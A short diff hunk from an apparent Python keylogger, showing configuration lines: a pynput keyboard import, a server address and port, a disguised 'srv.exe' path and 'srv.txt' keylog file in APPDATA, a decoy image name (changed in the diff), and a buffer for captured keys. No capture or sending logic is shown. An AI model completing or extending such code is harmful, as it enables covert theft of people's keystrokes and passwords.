@@ -14,7 +14,7 @@ import pynput.keyboard
 server_ip = "localhost"
 server_port = 54321
 file_location = os.environ["appdata"] + "\\srv.exe"
-image_file = "\\image.png"
+image_file = "\\kayoko.png"
 keylog_file = os.environ["appdata"] + "\\srv.txt"
 captured_keys = ""
 
